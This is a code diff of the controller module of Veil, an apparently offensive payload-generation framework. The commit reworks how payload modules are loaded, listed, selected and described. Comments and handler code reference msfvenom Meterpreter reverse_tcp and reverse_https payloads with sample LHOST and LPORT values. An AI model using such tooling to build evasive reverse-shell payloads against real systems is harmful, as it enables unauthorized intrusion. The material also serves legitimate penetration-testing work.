@@ -97,7 +97,7 @@ class Controller:
         # "help":"print help screen",
         self.commands = { "use":"use a specific payload",
                  "info":"information on a specific payload",
-                 "list":"list available languages/payloads",
+                 "list":"list available payloads",
                  "update":"update Veil to the latest version",
                  "exit":"exit Veil"}
 
@@ -113,49 +113,40 @@ class Controller:
 
     def LoadPayloads(self):
         """
-        Loads payload modules into an internal self.payloads object.
+        Crawl the module path and load up everything found into self.payloads.
+        """
+            
+        # crawl up to 5 levels down the module path
+        for x in xrange(1,5):    
+            # make the folder structure the key for the module
+            d = dict( ("/".join(path.split("/")[3:])[:-3], imp.load_source( "/".join(path.split("/")[3:])[:-3],path )  ) for path in glob.glob(join("./modules/payloads/" + "*/" * x,'[!_]*.py')) )
 
-        Loads all payload modules dynamically from ./modules/payloads/* and
-        builds store the instantiated payload objects in self.payloads. The
-        format for self.payloads is a list of tuples of the form [ (name : <payload object>) ]
+            # instantiate the payload stager
+            for name in d.keys():
+                module = d[name].Payload()
+                self.payloads.append( (name, module) )
+
+        # sort payloads by their key/path name
+        self.payloads = sorted(self.payloads, key=lambda x: (x[0]))
+
+
+    def ListPayloads(self):
+        """
+        Prints out available payloads in a nicely formatted way.
         """
 
-        # TODO: detect Windows and modify the paths appropriately
-        d = dict((splitext(basename(path))[0], imp.load_source(splitext(basename(path))[0],path)) for path in glob.glob(join(settings.VEIL_PATH + "/modules/payloads/*/",'[!_]*.py')) )
-        for name in d.keys():
-            stager = d[name].Stager()
-            # if specific languages to use are specified, only load those payload modules
-            if self.langs:
-                if stager.language in self.langs:
-                    self.payloads.append( (name, stager) )
-            else: self.payloads.append( (name, stager) )
-
-        # sort the payloads by language name
-        self.payloads = sorted(self.payloads, key=lambda x: (x[1].shortname))
-        self.payloads = sorted(self.payloads, key=lambda x: (x[1].language))
-
-
-    def ListLangs(self):
-        """
-        Prints out all available languages of loaded paylod modules.
-
-        """
-        langs = list()
-        for (name, payload) in self.payloads: langs.append(payload.language)
-        print (" Available languages:\n")
-        for lang in set(langs): print "\t" + helpers.color(lang)
+        print helpers.color(" [*] Available payloads:\n")
+        lastBase = None
+        x = 1
+        for (name, payload) in self.payloads:
+            parts = name.split("/")
+            if lastBase and parts[0] != lastBase:
+                print ""
+            lastBase = parts[0]
+            print "\t%s)\t%s" % (x, '{0: <24}'.format(name))
+            x += 1
         print ""
 
-
-    def ListPayloads(self, lang):
-        """
-        Prints out the available payloads for a specific language.
-
-        lang = the language to list ("python"/"c"/etc.)
-        """
-        print (" Available %s payloads:\n" % (helpers.color(lang)))
-        for (name, payload) in self.payloads:
-            if payload.language == lang: print "\t%s\t\t%s" % ('{0: <16}'.format(payload.shortname), payload.rating)
 
     def UpdateVeil(self, interactive=True):
         """
@@ -170,38 +161,25 @@ class Controller:
         if interactive:
             raw_input(" [>] Veil updated, press any key to continue: ")
 
-    def ListAllPayloads(self):
-        """
-        Prints out the name, language and rating of all loaded payloads.
-
-        """
-        print " Available payloads:\n"
-        lastLang=None
-        x = 1
-        for (name, payload) in self.payloads:
-            # this is so we can space out languages
-            if lastLang and payload.language != lastLang:
-                print ""
-            lastLang = payload.language
-            print "\t%s)\t%s\t\t%s" % (x, '{0: <24}'.format(payload.language + "/" + payload.shortname), payload.rating)
-            x+=1
-        print ""
-
 
     def PayloadInfo(self, payload, showTitle=True, showInfo=True):
         """
         Print out information about a specified payload.
 
         payload = the payload object to print information on
+        showTitle = whether to show the Veil title
+        showInfo = whether to show the payload information bit
 
         """
         if showTitle:
             messages.title()
 
         if showInfo:
-            print " Payload information:\n"
+            # extract the payload class name from the instantiated object, then chop off the language
+            payloadname = "/".join(str(payload.__class__).split(".")[0].split("/")[1:])
 
-            print "\tName:\t\t" + payload.shortname
+            print helpers.color(" Payload information:\n")
+            print "\tName:\t\t" + payloadname
             print "\tLanguage:\t" + payload.language
             print "\tRating:\t\t" + payload.rating
 
@@ -214,7 +192,7 @@ class Controller:
 
         # if required options were specified, output them
         if hasattr(self.payload, 'required_options'):
-            print "\n Required Options:\n"
+            print helpers.color("\n Required Options:\n")
 
             print " Name\t\t\tCurrent Value\tDescription"
             print " ----\t\t\t-------------\t-----------"
@@ -226,52 +204,41 @@ class Controller:
             print ""
 
 
-    def SetPayload(self, lang, name, options):
+    def SetPayload(self, payloadname, options):
         """
         Manually set the payload for this object with specified options.
 
-        lang = the language of the payload ("python"/"c"/etc.)
-        name = the payload to set ("VirtualAlloc"/etc.)
+        name = the payload to set, ex: c/meter/rev_tcp
         options = dictionary of required options for the payload, ex:
                 options['customShellcode'] = "\x00..."
                 options['required_options'] = {"compile_to_exe" : ["Y", "Compile to an executable"], ...}
                 options['msfvenom'] = ["windows/meterpreter/reverse_tcp", ["LHOST=192.168.1.1","LPORT=443"]
         """
 
-        # first extract out all languages  to make sure
-        # a language valid choice was passed
-        langs = list(set([payload.language for (n, payload) in  self.payloads]))
-        if lang not in langs:
-            print helpers.color("\n[!] Specified language '" + lang + "' not valid\n", warning=True)
-            self.ListLangs()
+        # iterate through the set of loaded payloads, trying to find the specified payload name
+        for (name, payload) in self.payloads:
+
+            if payloadname.lower() == name.lower():
+
+                # set the internal payload variable
+                self.payload = payload
+
+                # options['customShellcode'] = "\x00..."
+                if 'customShellcode' in options:
+                    self.payload.shellcode.setCustomShellcode(options['customShellcode'])
+                # options['required_options'] = {"compile_to_exe" : ["Y", "Compile to an executable"], ...}
+                if 'required_options' in options:
+                    for k,v in options['required_options'].items():
+                        self.payload.required_options[k] = v
+                # options['msfvenom'] = ["windows/meterpreter/reverse_tcp", ["LHOST=192.168.1.1","LPORT=443"]
+                if 'msfvenom' in options:
+                    self.payload.shellcode.SetPayload(options['msfvenom'])
+
+        # if a payload isn't found, then list available payloads and exit
+        if not self.payload:
+            print helpers.color(" [!] Invalid payload selected\n\n", warning=True)
+            self.ListPayloads()
             sys.exit()
-
-        # extract out the specific payloads for this language
-        payloads = list(set([payload.shortname for (n, payload) in  self.payloads if payload.language == lang]))
-        if name not in payloads:
-            print helpers.color("\n[!] Specified payload '"+name+"' not valid\n", warning=True)
-            self.ListPayloads(lang)
-            sys.exit()
-
-        # iterate through the set of loaded payloads, trying to match
-        # the language name and payload specified
-        for (n, payload) in self.payloads:
-            if payload.language == lang:
-                if payload.shortname == name:
-
-                    # set the internal payload variable
-                    self.payload = payload
-
-                    # options['customShellcode'] = "\x00..."
-                    if 'customShellcode' in options:
-                        self.payload.shellcode.setCustomShellcode(options['customShellcode'])
-                    # options['required_options'] = {"compile_to_exe" : ["Y", "Compile to an executable"], ...}
-                    if 'required_options' in options:
-                        for k,v in options['required_options'].items():
-                            self.payload.required_options[k] = v
-                    # options['msfvenom'] = ["windows/meterpreter/reverse_tcp", ["LHOST=192.168.1.1","LPORT=443"]
-                    if 'msfvenom' in options:
-                        self.payload.shellcode.SetPayload(options['msfvenom'])
 
 
     def ValidatePayload(self, payload):
@@ -352,7 +319,8 @@ class Controller:
         OutputFile.close()
 
         # start building the information string for the generated payload
-        message = "\n Language:\t\t"+helpers.color(payload.language)+"\n Payload:\t\t"+payload.shortname
+        payloadname = str(payload.__class__).split(".")[0]
+        message = "\n Language:\t\t"+helpers.color(payload.language)+"\n Payload:\t\t"+payloadname
 
         if hasattr(payload, 'shellcode'):
             # check if msfvenom was used or something custom, print appropriately
@@ -417,11 +385,12 @@ class Controller:
 
                 # if not BDF, try to extract the handler type from the payload name
                 else:
-                    if "tcp" in payload.shortname.lower():
+                    payloadname = str(payload.__class__).split(".")[0]
+                    if "tcp" in payloadname.lower():
                         handler += "set PAYLOAD windows/meterpreter/reverse_tcp\n"
-                    elif "https" in payload.shortname.lower():
+                    elif "https" in payloadname.lower():
                         handler += "set PAYLOAD windows/meterpreter/reverse_https\n"
-                    elif "http" in payload.shortname.lower():
+                    elif "http" in payloadname.lower():
                         handler += "set PAYLOAD windows/meterpreter/reverse_https\n"
                     else: pass
 
@@ -503,7 +472,9 @@ class Controller:
         if showTitle:
             messages.title()
 
-        print " Payload: " + helpers.color(payload.language + "/" + payload.shortname) + " loaded"
+        # extract the payload class name from the instantiated object
+        payloadname = str(payload.__class__).split(".")[0]
+        print " Payload: " + helpers.color(payloadname) + " loaded\n"
 
         self.PayloadInfo(payload, showTitle=False, showInfo=False)
         messages.helpmsg(self.payloadCommands, showTitle=False)
@@ -669,7 +640,7 @@ class Controller:
 
                     if len(cmd.split()) == 1:
                         messages.title()
-                        self.ListAllPayloads()
+                        self.ListPayloads()
                         showMessage=False
                         cmd = ""
 
@@ -689,16 +660,12 @@ class Controller:
                                 x += 1
 
                         # else choosing the payload by name
-                        elif len(p.split("/")) == 2:
-                            lang,payloadName = p.split("/")
-
-                            for (name, pay) in self.payloads:
-
+                        else:
+                            for (payloadName, pay) in self.payloads:
                                 # if we find the payload specified, kick off the payload menu
-                                if pay.language == lang:
-                                    if pay.shortname == payloadName:
-                                        self.payload = pay
-                                        self.outputFileName = self.PayloadMenu(self.payload)
+                                if payloadName == p:
+                                    self.payload = pay
+                                    self.outputFileName = self.PayloadMenu(self.payload)                                        
 
                         cmd = ""
                         showMessage=True
@@ -735,16 +702,12 @@ class Controller:
                                 x += 1
 
                         # else choosing the payload by name
-                        elif len(p.split("/")) == 2:
-                            lang,payloadName = p.split("/")
-
-                            for (name, pay) in self.payloads:
-
+                        else:
+                            for (payloadName, pay) in self.payloads:
                                 # if we find the payload specified, kick off the payload menu
-                                if pay.language == lang:
-                                    if pay.shortname == payloadName:
-                                        self.payload = pay
-                                        self.PayloadInfo(self.payload)
+                                if payloadName == p:
+                                    self.payload = pay
+                                    self.PayloadInfo(self.payload) 
 
                         cmd = ""
                         showMessage=False
@@ -758,19 +721,7 @@ class Controller:
 
                     if len(cmd.split()) == 1:
                         messages.title()
-                        self.ListAllPayloads()
-
-                    if len(cmd.split()) == 2:
-                        parts = cmd.split()
-                        if parts[1] == "all" or parts[1] == "payloads":
-                            messages.title()
-                            self.ListAllPayloads()
-                        elif parts[1] == "langs":
-                            messages.title()
-                            self.ListLangs()
-                        else:
-                            messages.title()
-                            self.ListPayloads(parts[1])
+                        self.ListPayloads()     
 
                     cmd = ""
                     showMessage=False
